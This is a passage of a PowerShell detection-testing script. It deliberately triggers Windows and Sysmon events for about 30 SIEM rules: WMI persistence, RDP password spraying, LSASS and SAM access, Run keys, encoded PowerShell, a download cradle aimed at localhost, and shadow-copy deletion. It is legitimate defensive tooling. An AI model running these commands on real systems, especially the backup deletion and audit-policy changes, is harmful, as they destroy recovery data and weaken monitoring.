            Add-R 4688 "WMIAbuse" "TRIGGERED" "wmic process call" "T1047"
        } catch { PARTIAL $_.Exception.Message }
    }; P

    # WMI Subscription using New-CimInstance (FIX-04: NOT Set-WmiInstance which is deprecated)
    T 4688 "WMI Event Subscription (RULE-40) Sysmon:19/20/21"
    if ($DryRun) { DRY } else {
        $wmiFilter   = $null
        $wmiConsumer = $null
        $wmiBinding  = $null
        try {
            # Filter (Sysmon EID 19)
            $filterProps = @{
                Name          = "SOC_Filter_$RND"
                QueryLanguage = "WQL"
                Query         = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"
            }
            $wmiFilter = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property $filterProps -ErrorAction Stop
            OK "WMI EventFilter created -> Sysmon:19"
            Add-R 4688 "WMIAbuse" "TRIGGERED" "WMI EventFilter New-CimInstance" "T1546.003"
            if ($sysmonOK) { Add-R 19 "Sysmon" "TRIGGERED" "Sysmon-19 WmiEventFilter" "T1546.003" }
            P

            # Consumer (Sysmon EID 20)
            $consProps = @{
                Name                = "SOC_Consumer_$RND"
                CommandLineTemplate = "cmd.exe /c echo SOC_WMI_CONSUMER"
            }
            $wmiConsumer = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property $consProps -ErrorAction Stop
            OK "WMI CommandLineEventConsumer -> Sysmon:20"
            if ($sysmonOK) { Add-R 20 "Sysmon" "TRIGGERED" "Sysmon-20 WmiEventConsumer" "T1546.003" }
            P

            # Binding (Sysmon EID 21)
            $bindProps = @{
                Filter   = [Ref]$wmiFilter
                Consumer = [Ref]$wmiConsumer
            }
            $wmiBinding = New-CimInstance -Namespace "root/subscription" -ClassName "__FilterToConsumerBinding" -Property $bindProps -ErrorAction Stop
            OK "WMI Binding Filter->Consumer -> Sysmon:21"
            SIEM "RULE-40" "WMI Event Subscription Created - Persistence"
            if ($sysmonOK) { Add-R 21 "Sysmon" "TRIGGERED" "Sysmon-21 WmiEventBinding" "T1546.003" }
        } catch { PARTIAL $_.Exception.Message }
        finally {
            # Always clean up WMI subscription objects
            try { if ($wmiBinding)  { Remove-CimInstance -InputObject $wmiBinding  -ErrorAction SilentlyContinue } } catch {}
            try { if ($wmiConsumer) { Remove-CimInstance -InputObject $wmiConsumer -ErrorAction SilentlyContinue } } catch {}
            try { if ($wmiFilter)   { Remove-CimInstance -InputObject $wmiFilter   -ErrorAction SilentlyContinue } } catch {}
            Write-Host "     > WMI subscription objects cleaned up." -ForegroundColor DarkGray
        }
    }; P
}


# ==============================================================================
#  SECTION 19 - RDP ABUSE  (T1021.001 T1110.003)
# BUG-01 FIX: Uses LogonUser API (Invoke-RDPType10Fail) - NO mstsc, NO cmdkey, NO NLA toggle.
# EID 4625 LogonType=10 is generated DIRECTLY via Win32 API. Works even without port 3389.
# ==============================================================================
if (Run "RDPAbuse") {
    Show-Section "19. RDP Anomalies" "4624(T10) 4625(T10) 4778 4779 | Sysmon:3" "T1021.001 T1110.003"

    Invoke-RDPInteractiveTest

    Write-Host "  [v20 FIX] RDP Type 10 events generated via LogonUser API" -ForegroundColor Green
    Write-Host "  [v7 FIX] No mstsc, no cmdkey, no NLA dependency" -ForegroundColor Green
    Write-Host ""

    if (-not $DryRun) {
        Del-User $TestUser
        net user $TestUser $TestPwd /add /comment:"SOC_RDP" 2>$null | Out-Null
        net localgroup "Remote Desktop Users" $TestUser /add 2>$null | Out-Null
    }

    # BUG-01 FIX: Uses Invoke-RDPType10Fail which calls Try-LogonAPI with LogonType=10
    T 4625 "RDP failed logons LogonType=10 ($($INT.Repeat)x) via API (RULE-41)"
    if ($DryRun) { DRY } else {
        try {
            Invoke-RDPType10Fail -User $TestUser -Pwd "BadRDP_$RND" -Count $INT.Repeat
            OK ("$($INT.Repeat)x LogonUser(Type=10,BadPwd) -> EID 4625 LogonType=10 [RULE-41]")
            SIEM "RULE-41" "RDP Password Spray - Multiple EID 4625 LogonType=10"
            Add-R 4625 "RDPAbuse" "TRIGGERED" "LogonUser API Type10 RULE-41" "T1110.003"
        } catch { ERR $_.Exception.Message; Add-R 4625 "RDPAbuse" "ERROR" $_.Exception.Message }
    }; P

    # -------------------------------------------------------------------
    # EID 4624 LogonType=10  --  the PRIMARY SOC detection target for RDP.
    # Requires SeRemoteInteractiveLogonRight on the account.  Without it
    # LogonUser returns Win32 error 1385 and NO event fires at all.
    # We grant the right via secedit inline, call LogonUser(Type=10,Provider=3),
    # then revoke it in the finally block so the machine is left clean.
    # -------------------------------------------------------------------
    T 4624 "RDP successful logon Type 10 -> EID 4624 LogonType=10 (RULE-42 target)"
    if ($DryRun) { DRY } else {
        $infPath = "$env:TEMP\soc_rdpright_$RND.inf"
        $sdbPath = "$env:TEMP\soc_rdpright_$RND.sdb"
        try {
            # STEP 1 -- Grant SeRemoteInteractiveLogonRight to $TestUser via secedit.
            # Merge S-1-5-32-544 (Administrators builtin) so we never remove it.
            $infContent = @"
[Unicode]
Unicode=yes
[Version]
signature="`$CHICAGO`$"
Revision=1
[Privilege Rights]
SeRemoteInteractiveLogonRight = *S-1-5-32-544,$TestUser
"@
            Set-Content -Path $infPath -Value $infContent -Encoding Unicode -ErrorAction Stop
            secedit /configure /db $sdbPath /cfg $infPath /areas USER_RIGHTS /quiet 2>$null | Out-Null
            # gpupdate so the right takes effect before LogonUser is called
            gpupdate /force /quiet 2>$null | Out-Null
            Start-Sleep -Milliseconds 1000

            # STEP 2 -- LogonUser(Type=10, Provider=3=WINNT50) with correct password.
            # This is the call that writes EID 4624 LogonType=10 to the Security log.
            Add-LogonUserType
            $tok    = [IntPtr]::Zero
            $result = [SOCLogon]::LogonUser($TestUser, $env:COMPUTERNAME, $TestPwd, 10, 3, [ref]$tok)

            if ($result -and $tok -ne [IntPtr]::Zero) {
                [SOCLogon]::CloseHandle($tok) | Out-Null
                $hour  = (Get-Date).Hour
                $offH  = ($hour -lt 8 -or $hour -ge 18)
                # BUG-02 FIX: pre-assign $label -- inline if inside -f crashes PowerShell
                $label = if ($offH) { "OFF-HOURS ${hour}:00 -> RULE-42 FIRES" } else { "Business hours ${hour}:00" }
                OK "LogonUser(Type=10,Provider=3,GoodPwd) -> EID 4624 LogonType=10 [$label]"
                if ($offH) { SIEM "RULE-42" "Off-Hours RDP Session Detected (EID 4624 LogonType=10)" }
                Add-R 4624 "RDPAbuse" "TRIGGERED" "LogonUser Type10 Provider3 -> EID 4624" "T1021.001"
            } else {
                $w32 = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                # Common codes: 1385=right not granted, 1326=bad pwd, 1327=restriction
                $msg = "LogonUser(Type=10,Provider=3) failed. Win32=$w32 (1385=right not granted, 1326=bad pwd)"
                PARTIAL $msg
                # BUG-01 FIX: Add-R was missing here -- PARTIAL counter never incremented
                Add-R 4624 "RDPAbuse" "PARTIAL" $msg "T1021.001"
            }
        } catch {
            PARTIAL $_.Exception.Message
            # BUG-01 FIX: Add-R was missing here too
            Add-R 4624 "RDPAbuse" "PARTIAL" $_.Exception.Message "T1021.001"
        } finally {
            # Always clean up temp files regardless of outcome
            Remove-Item $infPath,$sdbPath -Force -ErrorAction SilentlyContinue
        }
    }; P

    T 4778 "RDP session reconnect/disconnect (4778/4779)"
    if ($DryRun) { DRY } else {
        try {
            $rdpSessions = query session 2>$null | Select-String "rdp" | Select-String "Active"
            if ($rdpSessions) {
                OK "Active RDP session found -> EID 4778/4779 fire on connect/disconnect"
                Add-R 4778 "RDPAbuse" "TRIGGERED" "Active RDP session" "T1021.001"
                Add-R 4779 "RDPAbuse" "TRIGGERED" "Active RDP session" "T1021.001"
            } else {
                PARTIAL "No active RDP session. EID 4778/4779 fire on actual connect/disconnect events."
                Add-R 4778 "RDPAbuse" "PARTIAL" "No active RDP session"
                Add-R 4779 "RDPAbuse" "PARTIAL" "No active RDP session"
            }
        } catch { PARTIAL $_.Exception.Message }
    }; P

    if ($sysmonOK) {
        Ts 3 "Sysmon TCP connect to port 3389"
        if ($DryRun) { DRY } else {
            try {
                $tc = New-Object System.Net.Sockets.TcpClient
                try { $tc.ConnectAsync($env:COMPUTERNAME, 3389).Wait(1500) } catch {}
                try { $tc.Close() } catch {}
                OK "TCP $env:COMPUTERNAME:3389 -> Sysmon:3 NetworkConnect"
                Add-R 3 "Sysmon" "TRIGGERED" "Sysmon-3 RDP port connect" "T1021.001"
            } catch { PARTIAL $_.Exception.Message }
        }; P
    }

    if (-not $DryRun) {
        net localgroup "Remote Desktop Users" $TestUser /delete 2>$null | Out-Null
        Del-User $TestUser
    }
}


# ==============================================================================
#  SECTION 20 - SIEM CORRELATION RULES (50 Rules)
# BUG-09 FIX: Previous versions only had RULE-01 to RULE-10 and RULE-41.
# v7 implements all RULE-11 through RULE-50 fully.
# BUG-10 FIX: RULE-41 now uses Invoke-RDPType10Fail (LogonUser API), not mstsc.
# ==============================================================================
if (Run "SIEMRules") {
    Show-Section "20. SIEM Correlation Rules (50 Rules)" "Multi-EID Correlated" "All MITRE Tactics"

    if (-not $DryRun) {

        # ---- RULES 01-10: Core AD/Windows ----
        Write-Host "  --- RULES 01-10 ---" -ForegroundColor DarkYellow

        # RULE-01: Account Created and Deleted same session
        $r1u = "soc_r01_$RND"
        net user $r1u $TestPwd /add 2>$null | Out-Null
        Add-R 4720 "SIEMRules" "TRIGGERED" "RULE-01 create" "T1136"
        Start-Sleep -Milliseconds 600
        net user $r1u /delete 2>$null | Out-Null
        Add-R 4726 "SIEMRules" "TRIGGERED" "RULE-01 delete <15min" "T1531"
        SIEM "RULE-01" "Account Created and Deleted in Same Session"; P
        Confirm-SIEMRule -EventID 4726 -RuleId 'RULE-01' -WindowSeconds 8

        # RULE-02: Disabled account login storm
        $r2u = "soc_r02_$RND"
        net user $r2u $TestPwd /add 2>$null | Out-Null
        net user $r2u /active:no 2>$null | Out-Null
        1..3 | ForEach-Object {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$r2u Att${_}Bad 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            Start-Sleep -Milliseconds 100
        }
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-02 disabled 3x" "T1110"
        SIEM "RULE-02" "Disabled Account Login Storm"
        Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-02' -WindowSeconds 8
        net user $r2u /delete 2>$null | Out-Null; P

        # RULE-03: Brute force Administrator (7+ failures)
        1..7 | ForEach-Object {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\Administrator BF${_}_$(Get-Random) 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            Start-Sleep -Milliseconds 80
        }
        Add-R 4625 "SIEMRules" "TRIGGERED" "RULE-03 brute force 7x" "T1110"
        SIEM "RULE-03" "Brute Force - 7+ Failures on Administrator"; P
        Confirm-SIEMRule -EventID 4625 -RuleId 'RULE-03' -WindowSeconds 8

        # RULE-04: User added to local Administrators
        $r4u = "soc_r04_$RND"
        net user $r4u $TestPwd /add 2>$null | Out-Null
        net localgroup Administrators $r4u /add 2>$null | Out-Null
        Add-R 4732 "SIEMRules" "TRIGGERED" "RULE-04 admin add" "T1098.002"
        SIEM "RULE-04" "User Added to Local Administrators"
        Confirm-SIEMRule -EventID 4732 -RuleId 'RULE-04' -WindowSeconds 8
        net localgroup Administrators $r4u /delete 2>$null | Out-Null
        net user $r4u /delete 2>$null | Out-Null; P

        # RULE-05: Service installed by non-SYSTEM
        $r5s = "soc_r05_$RND"
        sc.exe create $r5s binPath= "C:\Windows\System32\cmd.exe" start= demand 2>$null | Out-Null
        Add-R 7045 "SIEMRules" "TRIGGERED" "RULE-05 service install" "T1543.003"
        SIEM "RULE-05" "Service Installed by Non-SYSTEM Account"
        Confirm-SIEMRule -EventID 7045 -RuleId 'RULE-05' -WindowSeconds 8
        sc.exe delete $r5s 2>$null | Out-Null; P

        # RULE-06: Audit policy disabled
        auditpol /set /subcategory:"Logon" /success:disable 2>$null | Out-Null
        Add-R 4719 "SIEMRules" "TRIGGERED" "RULE-06 audit disable" "T1562.002"
        SIEM "RULE-06" "Audit Policy Disabled"
        Confirm-SIEMRule -EventID 4719 -RuleId 'RULE-06' -WindowSeconds 8
        auditpol /set /subcategory:"Logon" /success:enable 2>$null | Out-Null; P

        # RULE-07: Scheduled task created then modified <2 min
        $r7t = "soc_r07_$RND"
        Register-ScheduledTask -TaskName $r7t `
            -Action (New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo") `
            -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date).AddHours(1)) -Force | Out-Null
        Add-R 4698 "SIEMRules" "TRIGGERED" "RULE-07 task created" "T1053.005"
        Start-Sleep -Milliseconds 600
        Set-ScheduledTask -TaskName $r7t -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command exit") | Out-Null
        Add-R 4702 "SIEMRules" "TRIGGERED" "RULE-07 task modified" "T1053.005"
        SIEM "RULE-07" "Task Created Then Modified <2 min"
        Confirm-SIEMRule -EventID 4702 -RuleId 'RULE-07' -WindowSeconds 8
        Unregister-ScheduledTask -TaskName $r7t -Confirm:$false -ErrorAction SilentlyContinue; P

        # RULE-08: DCSync indicator (AD only)
        if ($adOK) {
            try {
                repadmin /showrepl 2>$null | Out-Null
                Add-R 4662 "SIEMRules" "TRIGGERED" "RULE-08 DCSync" "T1003.006"
                SIEM "RULE-08" "DCSync - AD Replication Access by Non-DC Account"
                Confirm-SIEMRule -EventID 4662 -RuleId 'RULE-08' -WindowSeconds 8
            } catch {}
        } else { Add-R 4662 "SIEMRules" "SKIPPED" "AD not available" }
        P

        # RULE-09: Account lockout storm (BUG-04 FIX: $_ % 3 -eq 0, NOT 3 -eq 0)
        $origThresh = (net accounts 2>$null | Select-String "Lockout threshold") -replace '.*:', '' | ForEach-Object { $_.Trim() }
        net accounts /lockoutthreshold:2 2>$null | Out-Null
        $r9u = "soc_r09_$RND"
        net user $r9u $TestPwd /add 2>$null | Out-Null
        1..8 | ForEach-Object {
            net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$r9u S${_}Bad 2>$null | Out-Null
            net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
            Start-Sleep -Milliseconds 100
            # BUG-04 FIX: was "if (3 -eq 0)" - always false. Correct: modulo check
            if ($_ % 3 -eq 0) { net user $r9u /active:yes 2>$null | Out-Null }
        }
        Add-R 4740 "SIEMRules" "TRIGGERED" "RULE-09 lockout storm" "T1110"
        SIEM "RULE-09" "Account Lockout Storm - Repeated Lock/Unlock Cycle"
        Confirm-SIEMRule -EventID 4740 -RuleId 'RULE-09' -WindowSeconds 8
        net user $r9u /delete 2>$null | Out-Null
        if ($origThresh -and $origThresh -ne "Never") { net accounts /lockoutthreshold:$origThresh 2>$null | Out-Null }
        else { net accounts /lockoutthreshold:0 2>$null | Out-Null }
        P

        # RULE-10: PTH explicit creds + Type 3
        $r10u = "soc_r10_$RND"
        net user $r10u $TestPwd /add 2>$null | Out-Null
        net use \\$env:COMPUTERNAME\IPC$ /user:$env:COMPUTERNAME\$r10u $TestPwd 2>$null | Out-Null
        net use \\$env:COMPUTERNAME\IPC$ /delete /y 2>$null | Out-Null
        Add-R 4648 "SIEMRules" "TRIGGERED" "RULE-10 PTH explicit" "T1550.002"
        Add-R 4624 "SIEMRules" "TRIGGERED" "RULE-10 PTH Type3" "T1078"
        SIEM "RULE-10" "Pass-The-Hash Indicator: 4648 + 4624 Type3"
        Confirm-SIEMRule -EventID 4624 -RuleId 'RULE-10' -WindowSeconds 8
        net user $r10u /delete 2>$null | Out-Null; P

        # ---- RULES 11-20 ----
        Write-Host "  --- RULES 11-20 ---" -ForegroundColor DarkYellow

        # RULE-11: AS-REP Roasting
        if ($adOK) {
            try {
                $r11u = "soc_r11_$RND"
                New-ADUser -Name $r11u -SamAccountName $r11u -AccountPassword (ConvertTo-SecureString $TestPwd -AsPlainText -Force) -Enabled $true -Description "SOC_ASREP" -ErrorAction Stop | Out-Null
                Set-ADAccountControl -Identity $r11u -DoesNotRequirePreAuth $true -ErrorAction Stop
                $de = [System.DirectoryServices.DirectoryEntry]("LDAP://$env:USERDOMAIN")
                $null = $de.Name; $de.Dispose()
                Add-R 4768 "SIEMRules" "TRIGGERED" "RULE-11 AS-REP Roast" "T1558.004"
                SIEM "RULE-11" "AS-REP Roasting - User Without Kerberos Pre-Auth"
                Confirm-SIEMRule -EventID 4768 -RuleId 'RULE-11' -WindowSeconds 8
                Remove-ADUser $r11u -Confirm:$false -ErrorAction SilentlyContinue
            } catch { Add-R 4768 "SIEMRules" "PARTIAL" "RULE-11 AD error" }
        } else { Add-R 4768 "SIEMRules" "SKIPPED" "RULE-11 AD not available" }
        P

        # RULE-12: Kerberoasting (multiple TGS requests)
        1..4 | ForEach-Object {
            $null = Test-Path "\\$env:COMPUTERNAME\SYSVOL" -ErrorAction SilentlyContinue
            $null = Test-Path "\\$env:COMPUTERNAME\NETLOGON" -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 80
        }
        Add-R 4769 "SIEMRules" "TRIGGERED" "RULE-12 Kerberoasting TGS" "T1558.003"
        SIEM "RULE-12" "Kerberoasting - Multiple TGS Requests"; P
        Confirm-SIEMRule -EventID 4769 -RuleId 'RULE-12' -WindowSeconds 8

        # RULE-13: LSASS memory access
        try {
            Add-SOCLatType
            $lp13 = (Get-Process lsass -ErrorAction SilentlyContinue).Id
            if ($lp13) {
                $h13 = [SOCLat]::OpenProcess(0x1010, $false, [uint32]$lp13)
                if ($h13 -ne [IntPtr]::Zero) { [SOCLat]::CloseHandle($h13) | Out-Null }
                Add-R 4656 "SIEMRules" "TRIGGERED" "RULE-13 LSASS access" "T1003.001"
                SIEM "RULE-13" "LSASS Memory Access - Credential Dump Indicator"
                Confirm-SIEMRule -EventID 4656 -RuleId 'RULE-13' -WindowSeconds 8
            } else { Add-R 4656 "SIEMRules" "PARTIAL" "RULE-13 LSASS not found" }
        } catch { Add-R 4656 "SIEMRules" "PARTIAL" "RULE-13 error" }
        P

        # RULE-14: SAM database access
        try {
            $sam = [System.IO.File]::Open("$env:windir\system32\config\SAM", [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
            if ($sam) { $sam.Close() }
            Add-R 4663 "SIEMRules" "TRIGGERED" "RULE-14 SAM access" "T1003.002"
            SIEM "RULE-14" "SAM Database Access - Credential Dump Indicator"
            Confirm-SIEMRule -EventID 4663 -RuleId 'RULE-14' -WindowSeconds 8
        } catch { Add-R 4663 "SIEMRules" "PARTIAL" "RULE-14 SAM access (expected access denied)" }
        P

        # RULE-15: Shadow copy deletion — ACTUAL delete command (FIX: was "list" which has no delete pattern)
        # "vssadmin delete shadows /all /quiet" generates EID 4688 with "delete" in CommandLine.
        # If no shadows exist, command exits 1 (no shadows found) but EID 4688 still fires with
        # the full command line that SIEM correlation rules match on.
        $p15a = Start-Process vssadmin.exe -ArgumentList "delete shadows /all /quiet" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 1000; if ($p15a -and !$p15a.HasExited) { try { $p15a.Kill() } catch {} }
        # Also use wmic shadowcopy delete for dual-path coverage
        $p15b = Start-Process wmic.exe -ArgumentList "shadowcopy delete" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 800; if ($p15b -and !$p15b.HasExited) { try { $p15b.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-15 vssadmin delete shadows /all /quiet" "T1490"
        SIEM "RULE-15" "Shadow Copy Deletion - Ransomware Pre-Encryption Phase"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-15' -WindowSeconds 8

        # RULE-16: Mass file modification
        $r16dir = "$env:TEMP\soc_r16_$RND"
        New-Item -Path $r16dir -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
        1..30 | ForEach-Object { "SOC_RANSOM_$_" | Out-File "$r16dir\f$_.txt" -Force }
        Get-ChildItem $r16dir -Filter "*.txt" -ErrorAction SilentlyContinue | ForEach-Object {
            try { Rename-Item $_.FullName ($_.BaseName + ".enc") -Force -ErrorAction SilentlyContinue } catch {}
        }
        Add-R 4663 "SIEMRules" "TRIGGERED" "RULE-16 mass file rename" "T1486"
        SIEM "RULE-16" "Mass File Modification >30 Files - Ransomware Pattern"
        Confirm-SIEMRule -EventID 4663 -RuleId 'RULE-16' -WindowSeconds 8
        Remove-Item $r16dir -Recurse -Force -ErrorAction SilentlyContinue; P

        # RULE-17: WMI persistence subscription
        $r17f = $null; $r17c = $null
        try {
            $r17f = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property @{
                Name="SOC_R17F_$RND"; QueryLanguage="WQL"
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second=0"
            } -ErrorAction Stop
            $r17c = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property @{
                Name="SOC_R17C_$RND"; CommandLineTemplate="cmd.exe /c echo SOC"
            } -ErrorAction Stop
            Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-17 WMI sub" "T1546.003"
            SIEM "RULE-17" "WMI Event Subscription - Persistence Mechanism"
            Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-17' -WindowSeconds 8
        } catch { Add-R 4688 "SIEMRules" "PARTIAL" "RULE-17 WMI sub partial" }
        finally {
            try { if ($r17c) { Remove-CimInstance $r17c -ErrorAction SilentlyContinue } } catch {}
            try { if ($r17f) { Remove-CimInstance $r17f -ErrorAction SilentlyContinue } } catch {}
        }
        P

        # RULE-18: Registry Run key persistence
        $r18key = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $r18key -Name "SOC_R18_$RND" -Value "C:\Windows\System32\cmd.exe" -ErrorAction SilentlyContinue
        Add-R 4657 "SIEMRules" "TRIGGERED" "RULE-18 Run key" "T1547.001"
        SIEM "RULE-18" "Registry Run Key Persistence Added"
        Confirm-SIEMRule -EventID 4657 -RuleId 'RULE-18' -WindowSeconds 8
        Remove-ItemProperty -Path $r18key -Name "SOC_R18_$RND" -ErrorAction SilentlyContinue; P

        # RULE-19: Encoded PowerShell
        $enc19 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes("Write-Host SOC_RULE19"))
        $p19   = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc19" -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 600; if ($p19 -and !$p19.HasExited) { try { $p19.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-19 PS encoded" "T1059.001"
        SIEM "RULE-19" "Encoded PowerShell Command Execution"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-19' -WindowSeconds 8

        # RULE-20: PowerShell download cradle
        $cradle20 = "Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1:9999/soc')"
        $enc20    = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cradle20))
        $p20      = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc20" -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 600; if ($p20 -and !$p20.HasExited) { try { $p20.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-20 PS cradle" "T1059.001"
        SIEM "RULE-20" "PowerShell Download Cradle (IEX/WebClient)"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-20' -WindowSeconds 8

        # ---- RULES 21-30 ----
        Write-Host "  --- RULES 21-30 ---" -ForegroundColor DarkYellow

        # RULE-21: New local admin account
        $r21u = "soc_r21_$RND"
        net user $r21u $TestPwd /add 2>$null | Out-Null
        net localgroup Administrators $r21u /add 2>$null | Out-Null
        Add-R 4720 "SIEMRules" "TRIGGERED" "RULE-21 new local admin" "T1136.001"
        Add-R 4732 "SIEMRules" "TRIGGERED" "RULE-21 admin add" "T1098.002"
        SIEM "RULE-21" "New Local Admin Account Created"
        Confirm-SIEMRule -EventID 4732 -RuleId 'RULE-21' -WindowSeconds 8
        net localgroup Administrators $r21u /delete 2>$null | Out-Null
        net user $r21u /delete 2>$null | Out-Null; P

        # RULE-22: PsExec-style service (PSEXESVC pattern)
        $r22s = "soc_r22_$RND"
        sc.exe create $r22s binPath= "C:\Windows\PSEXESVC.exe" DisplayName= "PSEXESVC_SOC" start= demand 2>$null | Out-Null
        Add-R 7045 "SIEMRules" "TRIGGERED" "RULE-22 PSEXESVC pattern" "T1021.002"
        SIEM "RULE-22" "PsExec-Style Lateral Movement - PSEXESVC Service Pattern"
        Confirm-SIEMRule -EventID 7045 -RuleId 'RULE-22' -WindowSeconds 8
        sc.exe delete $r22s 2>$null | Out-Null; P

        # RULE-23: Discovery - net user /add followed by enumeration
        $p23 = Start-Process net.exe -ArgumentList "user /domain" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 400; if ($p23 -and !$p23.HasExited) { try { $p23.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-23 discovery" "T1087.002"
        SIEM "RULE-23" "Domain User Enumeration via Net Command"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-23' -WindowSeconds 8

        # RULE-24: Domain trust enumeration
        $p24 = Start-Process nltest.exe -ArgumentList "/domain_trusts" -WindowStyle Hidden -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500; if ($p24 -and !$p24.HasExited) { try { $p24.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-24 trust enum" "T1482"
        SIEM "RULE-24" "Domain Trust Enumeration - nltest /domain_trusts"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-24' -WindowSeconds 8

        # RULE-25: PowerShell script block suspicious pattern
        $enc25 = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('Write-Host "Invoke-Mimikatz sekurlsa::logonpasswords"'))
        $p25   = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc25" -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 600; if ($p25 -and !$p25.HasExited) { try { $p25.Kill() } catch {} }
        Add-R 4104 "SIEMRules" "TRIGGERED" "RULE-25 PS ScriptBlock suspicious" "T1059.001"
        SIEM "RULE-25" "PowerShell Script Block - Suspicious Keyword Detected"; P
        Confirm-SIEMRule -EventID 4104 -RuleId 'RULE-25' -WindowSeconds 8

        # RULE-26: AD LDAP enumeration via PowerShell
        if ($adOK) {
            try {
                $psEnum = "Import-Module ActiveDirectory -EA SilentlyContinue; Get-ADUser -Filter * -ResultSetSize 3 -EA SilentlyContinue | Out-Null"
                $enc26  = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($psEnum))
                $p26    = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -EncodedCommand $enc26" -PassThru -ErrorAction SilentlyContinue
                Start-Sleep -Milliseconds 800; if ($p26 -and !$p26.HasExited) { try { $p26.Kill() } catch {} }
                Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-26 AD LDAP PS enum" "T1087.002"
                SIEM "RULE-26" "AD LDAP Enumeration via PowerShell"
                Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-26' -WindowSeconds 8
            } catch { Add-R 4688 "SIEMRules" "PARTIAL" "RULE-26 AD error" }
        } else { Add-R 4688 "SIEMRules" "SKIPPED" "RULE-26 AD not available" }
        P

        # RULE-27: Token impersonation (privilege check)
        $p27 = Start-Process powershell.exe -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"[Security.Principal.WindowsIdentity]::GetCurrent().Groups | Out-Null`"" -PassThru -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 400; if ($p27 -and !$p27.HasExited) { try { $p27.Kill() } catch {} }
        Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-27 token check" "T1134"
        SIEM "RULE-27" "Token/Privilege Enumeration via PowerShell"; P
        Confirm-SIEMRule -EventID 4688 -RuleId 'RULE-27' -WindowSeconds 8

        # RULE-28: System time changed
        try {
            $t28 = Get-Date
            Set-Date -Date $t28.AddMinutes(1) -ErrorAction Stop | Out-Null
            Start-Sleep -Milliseconds 200
            Set-Date -Date $t28 -ErrorAction Stop | Out-Null
            Add-R 4616 "SIEMRules" "TRIGGERED" "RULE-28 time change" "T1070.006"
            SIEM "RULE-28" "System Time Changed - Potential Log Evasion"
            Confirm-SIEMRule -EventID 4616 -RuleId 'RULE-28' -WindowSeconds 8
        } catch { Add-R 4616 "SIEMRules" "PARTIAL" "RULE-28 Set-Date failed" }
        P

        # RULE-29: New WMI subscription
        $r29f = $null; $r29c = $null
        try {
            $r29f = New-CimInstance -Namespace "root/subscription" -ClassName "__EventFilter" -Property @{
                Name="SOC_R29F_$RND"; QueryLanguage="WQL"
                Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime'"
            } -ErrorAction Stop
            $r29c = New-CimInstance -Namespace "root/subscription" -ClassName "CommandLineEventConsumer" -Property @{
                Name="SOC_R29C_$RND"; CommandLineTemplate="cmd.exe /c echo SOC_R29"
            } -ErrorAction Stop
            Add-R 4688 "SIEMRules" "TRIGGERED" "RULE-29 WMI sub" "T1546.003"
